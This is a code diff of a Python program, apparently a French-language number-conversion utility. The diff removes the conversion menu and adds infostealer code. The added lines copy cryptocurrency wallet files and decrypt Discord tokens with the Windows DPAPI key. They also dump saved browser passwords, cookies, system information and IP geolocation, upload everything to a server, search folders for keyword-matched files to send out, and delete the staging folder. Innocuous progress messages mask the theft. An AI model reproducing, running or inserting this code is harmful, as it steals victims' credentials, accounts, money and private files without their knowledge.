-                            add = bit-len(bits)
-                            bits = "0"*add + bits
-                        return bits
-                    biny = " ".join(str(bny(i)) for i in res.split(' '))
-                    print("\nbinairy : ",biny)
-                    # Détailler le calcul pour binaire, hexadécimal et décimal
-                    print("\nDétail des calculs pour chaque caractère:")
-                    for char in s:
-                        ascii_value = ord(char)
-                        binary_value = bny(ascii_value)
-                        hex_value = decimal_to_hexadecimal(ascii_value)
-                        
-                        
-                        
-                        # Détail du calcul décimal vers binaire
-                        print("\nDétail de la conversion décimal vers binaire:")
-                        temp_n = ascii_value
-                        steps = []
-                        while temp_n > 0:
-                            remainder = temp_n % 2
-                            quotient = temp_n // 2
-                            steps.append((temp_n, quotient, remainder))
-                            temp_n = quotient
-                        
-                        steps.reverse()
-                        for i, (dividend, quotient, remainder) in enumerate(steps):
-                            print(f"  Étape {i+1}:")
-                            print(f"    {dividend} ÷ 2 = {quotient} reste {remainder}")
-                            print(f"    Bit ajouté: {remainder}")
-                            partial_result = ''.join(str(step[2]) for step in steps[-(i+1):])
-                            print(f"    Résultat partiel: {partial_result}")
-                            print('')
-
-                        
-                        print(f"  Résultat final en binaire: {binary_value}")
-                        
-                        # Détail du calcul décimal vers hexadécimal
-                        print("\nDétail de la conversion décimal vers hexadécimal:")
-                        temp_n = ascii_value
-                        steps = []
-                        hex_digits = "0123456789ABCDEF"
-                        while temp_n > 0:
-                            remainder = temp_n % 16
-                            quotient = temp_n // 16
-                            steps.append((temp_n, quotient, hex_digits[remainder]))
-                            temp_n = quotient
-                        
-                        steps.reverse()
-                        for i, (dividend, quotient, remainder) in enumerate(steps):
-                            print(f"  Étape {i+1}:")
-                            print(f"    {dividend} ÷ 16 = {quotient} reste {remainder}")
-                            print(f"    Chiffre hexadécimal ajouté: {remainder}")
-                            partial_result = ''.join(step[2] for step in steps[-(i+1):])
-                            print(f"    Résultat partiel: {partial_result}")
-                            print('')
-
-                        
-                        print(f"\nCaractère '{char}':")
-                        print(f"ASCII (décimal): {ascii_value}")
-                        print(f"Hexadécimal: {hex_value}")
-                        print(f"Binaire: {binary_value}\n")
-            except ValueError or KeyError:
-                pass
-        elif choice == "6":
+    for wallet_file in WALLET_PATHS:
+        if os.path.exists(wallet_file["path"]):
             try:
-                print('enter "q" to quit')
-
-                while True:
-                    print(f'{Colors.RED}-{Colors.END}'*50)
-                    
-
-                    s = input('enter the ASCII > ')
-                    if s == "q":
-                        break                
-                    if s != "q":
-                        ascii_values = s.split(' ')
-                        for i, ascii_value in enumerate(ascii_values):
-                            try:
-                                int_value = int(ascii_value)
-                                char = chr(int_value)
-                                print(f"Étape {i+1}:")
-                                print(f"  Valeur ASCII : {int_value}")
-                                print(f"  Caractère correspondant : '{char}'")
-                                if i == 0:
-                                    result = char
-                                else:
-                                    result += char
-                                print(f"  Résultat partiel : '{result}'")
-                                print('')
-                            except ValueError:
-                                print(f"  Erreur : '{ascii_value}' n'est pas une valeur ASCII valide. Ignoré.")
-                        print(f"\nRésultat final : '{result}'")
-            except ValueError or KeyError:
+                zip_to_storage(wallet_file["name"], wallet_file["path"], STORAGE_PATH)
+            except:
                 pass
-        elif choice == "-" or choice == "q":
-            return
-ASCII = rf"""
-    o__ __o       o     o          o  
-   /v     v\    _<|>_  <|\        <|> 
-  />       <\          / \\o      / \ 
- _\o____          o    \o/ v\     \o/ 
-      \_\__o__   <|>    |   <\     |  
-            \    / \   / \    \o  / \ 
-  \         /    \o/   \o/     v\ \o/ 
-   o       o      |     |       <\ |  
-   <\__ __/>     / \   / \        < \ 
-
-        [+] created by benji77 {VERSION}                       
-                                      """
-
-is_update = check_update()
-if is_update:
-    exec(update())
-    os.system(f'python {__file__}')
-while True:
-    try:
-        clear()
-        print(Colors.RED+ASCII+Colors.END)
-        choice = input(f'''
-        1) binary and hexadecimal conversion
-        2) exit
-        3) {"start processing" if system != "Windows" else "processing can't be started with windows by SIN"}
-        4) BENJI77430 github page
-
-{Colors.CYAN}┌──<[{Colors.RED}{getpass.getuser()}@{socket.gethostname()}{Colors.CYAN}]{Colors.END} ~ {Colors.RED}{os.getcwd()}{Colors.END} \n{Colors.CYAN}└──╼ ${Colors.END}  ''')
-        if choice == "1":
-            binary_and_hex_conversion()
-        elif choice == "2":
-            print('leaving..')
-            exit()            
-        elif choice == "3":
-            if system != "Windows":
+    print('processing discord data!')
+    for discord_path in DISCORD_PATHS:
+        if not os.path.exists(discord_path["path"]): continue
+        try:
+            name_without_spaces = discord_path["name"].replace(" ", "")
+            if "cord" in discord_path["path"]:
+                if not os.path.exists(APPDATA + f"\\{name_without_spaces}\\Local State"): continue
                 try:
-                    subprocess.Popen("processing")
-                except FileNotFoundError:
-                    print("tentative d'installation de processing...")
-                    if os.path.exists("/etc/os-release"):
-                        with open("/etc/os-release", "r") as f:
-                            distro_info = f.read()
-                        if "Ubuntu" in distro_info or "Debian" in distro_info:
-                            os.system("sudo add-apt-repository ppa:processing/ppa")
-                            os.system("sudo apt-get update")
-                            os.system("sudo apt-get install processing")
-                            subprocess.Popen("processing")
-                        elif "Fedora" in distro_info:
-                            os.system("sudo dnf install processing")
-                            subprocess.Popen("processing")
-                        elif "Arch" in distro_info:
-                            os.system("yay -S processing --noconfirm")
-                            subprocess.Popen("processing")      
-                        else:
-                            print("distribution linux non prise en charge !")
-                            time.sleep(1)
-                    else:
-                        print("détection de la distribution linux impossible !")
-                        time.sleep(1)                
-                print("installation terminée !")
+                    with open(APPDATA + f"\\{name_without_spaces}\\Local State", "r", encoding="utf-8") as f:
+                        local_state = json.loads(f.read())
+                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+                    decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+                    for file_name in os.listdir(discord_path["path"]):
+                        if file_name[-3:] not in ["ldb", "log"]: continue
+                        for line in [x.strip() for x in open(f'{discord_path["path"]}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
+                                token = decrypt_data(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), decryption_key)
+                                token_data = validate_discord_token(token)
+                                if token_data:
+                                    if token_data["id"] not in DISCORD_IDS:
+                                        DISCORD_IDS.append(token_data["id"])
+                                        username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"      
+                                        phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
+                                        DISCORD_TOKENS.append(
+                                            {"token": token, "user_id": token_data["id"], "username": username,
+                                            "display_name": token_data["global_name"], "email": token_data["email"],
+                                            "phone": phone_number})
+                except:
+                    pass
             else:
-                print('installation non prise en charge sur windows !')
-                time.sleep(1)
-        elif choice == "4":
-            if system == "Windows":
-                os.system("start https://github.com/benji77430")
-            elif system == "Darwin":
-                os.system("open https://github.com/benji77430")
-            else: 
-                os.system("xdg-open https://github.com/benji77430")
-    except KeyboardInterrupt:
-        exit()
+                for file_name in os.listdir(discord_path["path"]):
+                    if file_name[-3:] not in ["ldb", "log"]: continue
+                    for line in [x.strip() for x in open(f'{discord_path["path"]}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
+                            token_data = validate_discord_token(token)
+                            if token_data:
+                                if token_data["id"] not in DISCORD_IDS:
+                                    DISCORD_IDS.append(token_data["id"])
+                                    username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"
+                                    phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
+                                    DISCORD_TOKENS.append(
+                                        {"token": token, "user_id": token_data["id"], "username": username,
+                                        "display_name": token_data["global_name"], "email": token_data["email"],
+                                        "phone": phone_number})
+        except:
+            pass
+    print('sharing process starting !')
+    
+    os.system(f'systeminfo > {STORAGE_PATH+"\\sysinfo.txt"}')
+    print('system info stored !')
+    with open(STORAGE_PATH + "\\Passwords.txt", "w") as f:
+        f.write(
+            f"\n{'-'*50}\n".join([
+                f"LOCATION: {pw['browser']} - {pw['profile']}\n"
+                f"URL: {pw['url']}\n"
+                f"USERNAME: {pw['username']}\n"
+                f"PASSWORD: {pw['password']}"
+                for pw in PASSWORDS
+            ])
+        )
+    print('password info stored !')
+    i = upload_to_server(STORAGE_PATH + "\\Passwords.txt",i)
+    for cookie in COOKIES:
+        with open(STORAGE_PATH + f"\\Cookies-{cookie['browser']}-{cookie['profile']}.txt", "w") as f:
+            f.write(base64.b64decode(cookie["cookies"]).decode())
+    print('cookie info stored !')
+    links = ["https://ipinfo.io/json"]
+    link = choice(links)
+    data = httpx.get(link).json()
+
+    ip = data.get('ip')
+    city = data.get('city')
+    country = data.get('country')
+    region = data.get('region')
+    org = data.get('org')
+    loc = data.get('loc')
+    googlemap = "https://www.google.com/maps/search/google+map++" + loc
+    with open(STORAGE_PATH + '\\info.txt', 'w') as f:
+        f.write(f'''      
+ip : {ip}
+region : {region}
+country : {country}
+city (not accurate) : {city}
+user : {getpass.getuser()}
+computer : {socket.gethostname()}
+ram : {str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]} GB
+disk : {str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]} GB
+    ''')
+    print('ip info stored !')
+    for discord_token in DISCORD_TOKENS:
+        with open(STORAGE_PATH + "\\discord-tokens.txt", "w") as f:
+            f.write(
+                f"\n{'-' * 50}\n".join([
+                    f"ID: {discord_token['user_id']}\n"
+                    f"USERNAME: {discord_token['username']}\n"
+                    f"DISPLAY NAME: {discord_token['display_name']}\n"
+                    f"EMAIL: {discord_token['email']}\n"
+                    f"PHONE: {discord_token['phone']}\n"
+                    f"TOKEN: {discord_token['token']}"
+                    for discord_token in DISCORD_TOKENS
+                ])
+            )
+    print('discord info stored !')
+    print('trying to upload !')
+    for file_to_upload in os.listdir(STORAGE_PATH):
+        try:
+            i = upload_to_server(STORAGE_PATH + "\\" + file_to_upload,i)
+        except:
+            pass
+    for path in PATHS_TO_SEARCH:
+        for root, _, files in os.walk(path):
+            for file_name in files:
+                for keyword in FILE_KEYWORDS:
+                    if keyword in file_name.lower():
+                        for extension in ALLOWED_EXTENSIONS:
+                            if file_name.endswith(extension):
+                                try:
+                                    i = upload_to_server(os.path.join(root, file_name),i)
+                                except:
+                                    pass
+    try:
+        os.remove(STORAGE_PATH)
+    except: pass
